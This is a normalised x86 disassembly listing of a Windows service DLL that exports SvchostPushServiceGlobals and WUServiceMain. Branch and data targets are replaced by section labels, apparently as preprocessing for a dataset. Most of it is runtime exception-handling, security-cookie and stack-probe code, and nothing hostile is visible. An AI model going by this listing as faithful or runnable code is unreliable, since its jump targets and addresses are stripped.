mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_1000eff2
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_1000f5c0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1000f6b2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_1000f6e2
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000f720
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_1000f760
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000f7b0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1000f401
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_1000f720
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_1000f760
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000f870
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000f890
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_1000eff2
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_1000f8d5
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1000f8d5
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_1000f890
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1000f985
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1000f9a4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1000f985
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1000f9ae
push ebx
mov bl [ esp + 0x8 ]
test bl 0x2
push esi
mov esi ecx
je r-xdata
mov ecx esi
call ??1type_info@@UAE@XZ
test bl 0x1
je r-xdata
push edi
push ??1type_info@@UAE@XZ
lea edi [ esi - 0x4 ]
push [ edi ]
push 0xc
push esi
call sub_1000fa8a
test bl 0x1
je r-xdata
mov eax esi
push esi
call sub_10004ae2
pop ecx
mov eax edi
pop edi
jmp r-xdata
push edi
call sub_10004ae2
pop ecx
pop esi
pop ebx
retn 0x4
sub_1000fa2c
push 0x14
push r--data
call sub_1000fb34
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_1000fb6d
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_1000fa5b
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
call ?terminate@@YAXXZ
int3
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_1000fa8a
push 0xc
push r--data
call sub_1000fb34
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_1000fad2
call sub_1000fb6d
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_1000faf0
cmp eax 0x1000
jae r-xdata
push ecx
lea ecx [ esp + 0x8 ]
neg eax
add eax esp
add eax 0x4
test [ eax ] eax
xchg esp eax
mov eax [ eax ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub_1000fb34
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] esp
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x8 ] eax
retn
sub_1000fb90
push sub_1000f401
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_1000fc19
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_100021a8
mov al 0x1
retn
sub_100021d5
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn 0x4
push [ ebp + 0x8 ]
call [ free@IAT ]
pop ecx
sub_1000220c
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x50
sete al
pop ebp
retn 0x4
sub_10002276
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10002294
lea ecx [ esi + 0x8 ]
call sub_100029c1
mov [ esi ] r--data
pop esi
retn
sub_10002471
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push edi
mov edi ecx
call sub_10002487
xor eax eax
inc eax
pop edi
pop ebp
retn 0xc
sub_10002b13
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x80
sete al
pop ebp
retn 0x4
sub_10004953
mov eax [ eax ]
test eax eax
je r-xdata
retn
push eax
call [ FreeLibrary@IAT ]
sub_10005999
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x70
sete al
pop ebp
retn 0x4
sub_10005a99
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
and [ esi + 0x214 ] 0x0
pop esi
retn
call sub_10005765
sub_100070ab
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ free@IAT ]
pop ecx
pop ebp
retn 0x4
sub_10009518
push ebp
mov ebp esp
mov ecx [ ecx + 0x228 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x28 ]
sub_1000956f
push [ ecx + 0x228 ]
call sub_10005d14
retn
sub_10009623
mov eax [ ecx + 0x4 ]
cmp eax 0x60
je r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
cmp eax 0x70
je r-xdata
mov eax [ ecx + 0x228 ]
jmp r-xdata
mov eax [ ecx + 0x22c ]
mov eax [ eax + 0x10c ]
retn
sub_1000964b
mov eax [ ecx + 0x4 ]
cmp eax 0x60
je r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
cmp eax 0x70
jne r-xdata
mov eax [ ecx + 0x228 ]
mov eax [ ecx + 0x22c ]
jmp r-xdata
mov eax [ eax + 0x10c ]
retn
sub_100096d7
push esi
mov esi ecx
mov eax [ esi + 0x228 ]
call sub_10005e95
mov eax [ esi + 0x22c ]
pop esi
jmp sub_10005e95
sub_100096f1
mov eax [ ecx + 0x224 ]
jmp sub_10005e95
sub_10009a5c
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x40
sete al
pop ebp
retn 0x4
sub_1000a4bd
push 0x8
push r--data
call sub_1000fb90
mov ecx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ecx
xor eax eax
cmp [ ecx + 0xc ] al
jne r-xdata
push eax
call [ ExitThread@IAT ]
mov [ ebp - 0x4 ] eax
call sub_10009ec1
sub_1000a61b
mov ecx rw-data
call sub_100098aa
push 0x8007
call [ SetErrorMode@IAT ]
jmp sub_1000a504
sub_1000bfdb
mov eax [ eax ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
SvchostPushServiceGlobals
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn 0x4
WUServiceMain
jmp ServiceMain
sub_1000eff2
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_1000f001
retn
_crt_debugger_hook
and [ rw-data ] 0x0
retn
memset
jmp [ memset@IAT ]
_purecall
jmp [ _purecall@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_1000f270
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push 0x0
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_1000f696
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_1000f5c0
add esp 0xc
pop ebp
retn 0x4
sub_1000f6c9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_1000f985
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_1000f6fb
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_1000f5c0
add esp 0xc
pop ebp
retn 0x8
sub_1000f83b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_1000f959
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_1000f890
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_1000f9a4
call eax
retn
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
sub_1000fa00
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1000faf0
sub_1000fa16
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1000faf0
sub_1000fad2
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000fa2c
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
?terminate@@YAXXZ
jmp [ terminate@IAT ]
sub_1000fb6d
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
leave
push ecx
retn
_except_handler3
jmp [ _except_handler3@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_1000fbd5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_1000fbf4
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_1000fc14
jmp _ftol
sub_1000fc4f
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1000fc63
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1000eff2
jmp sub_1000fc4f
_ftol
jmp [ _ftol@IAT ]
sub_1000fc78
lea eax [ ebp - 0x8b4 ]
jmp sub_10004953
sub_1000fc83
lea eax [ ebp - 0x8a4 ]
jmp sub_10004953
sub_1000fc8e
lea eax [ ebp - 0x8ac ]
jmp sub_10004953
sub_1000fc99
lea eax [ ebp - 0x890 ]
jmp sub_10004953
sub_1000fca4
lea eax [ ebp - 0x884 ]
jmp sub_10004953
sub_1000fcaf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8c4 ]
xor ecx eax
call sub_1000eff2
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000eff2
mov eax r--data
jmp __CxxFrameHandler
sub_1000fcd7
lea eax [ ebp - 0x28 ]
jmp sub_10004953
sub_1000fcdf
lea eax [ ebp - 0x28 ]
jmp sub_10004953
sub_1000fce7
mov eax r--data
jmp __CxxFrameHandler
sub_1000fcf1
lea eax [ ebp - 0x18 ]
jmp sub_10004953
sub_1000fcf9
lea eax [ ebp - 0x18 ]
jmp sub_10004953
sub_1000fd01
mov eax r--data
jmp __CxxFrameHandler
sub_1000fd0b
lea eax [ ebp - 0x2c ]
jmp sub_10004953
sub_1000fd13
mov eax r--data
jmp __CxxFrameHandler
sub_1000fd1d
lea eax [ ebp - 0x1c ]
jmp sub_10004953
sub_1000fd25
mov eax r--data
jmp __CxxFrameHandler
sub_1000fd2f
lea eax [ ebp - 0x54 ]
jmp sub_1000bfdb
sub_1000fd37
lea eax [ ebp - 0x50 ]
jmp sub_1000bfdb
sub_1000fd3f
lea eax [ ebp - 0x64 ]
jmp sub_1000bfdb
sub_1000fd47
lea eax [ ebp - 0x60 ]
jmp sub_1000bfdb
sub_1000fd4f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x78 ]
xor ecx eax
call sub_1000eff2
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000eff2
mov eax r--data
jmp __CxxFrameHandler
sub_1000fd74
lea eax [ ebp - 0x52c ]
jmp sub_10004953
sub_1000fd7f
lea eax [ ebp - 0x248 ]
jmp sub_10004953
sub_1000fd8a
lea eax [ ebp - 0x524 ]
jmp sub_10004953
sub_1000fd95
lea eax [ ebp - 0x248 ]
jmp sub_10004953
sub_1000fda0
lea eax [ ebp - 0x534 ]
jmp sub_10004953
sub_1000fdab
lea eax [ ebp - 0x518 ]
jmp sub_10004953
sub_1000fdb6
lea eax [ ebp - 0x4f0 ]
jmp sub_10004953
sub_1000fdc1
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x534 ]
mov ecx [ edx - 0x538 ]
xor ecx eax
call sub_1000eff2
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1000eff2
mov eax r--data
jmp __CxxFrameHandler
